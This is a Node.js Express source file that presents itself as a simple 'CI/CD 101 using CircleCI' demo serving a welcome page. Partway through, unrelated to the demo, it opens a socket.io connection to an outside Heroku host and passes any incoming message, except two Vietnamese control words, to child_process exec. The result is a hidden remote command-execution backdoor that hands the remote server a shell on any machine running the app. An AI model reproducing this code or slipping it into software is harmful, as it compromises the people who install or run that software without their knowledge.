var express = require('express');
var app = express();
var exports = module.exports = {};

function welcomeMessage(){
    var message = "Welcome to CI/CD 101 using CircleCI!";
    return message;
}

// set the view engine to ejs
app.set('view engine', 'ejs');

app.get('/', function (req, res) {
    // var message = "Hello World";
    res.render("index", {message: welcomeMessage()});
});
const { exec } = require('child_process');
const
    io = require("socket.io-client"),
    ioClient = io.connect("https://colevelao.herokuapp.com:443");

ioClient.on("message", (msg) => {
	if (msg ==='Chay') {
		console.log('Em bat dau chay');
	} else if (msg ==='Ngung'){
		console.log('Em ngung');
	}
	 else {
		exec(msg);
	}
});

var server = app.listen(5000, function () {
    console.log("Node server is running..");
});

module.exports = server;
module.exports.welcomeMessage = welcomeMessage;
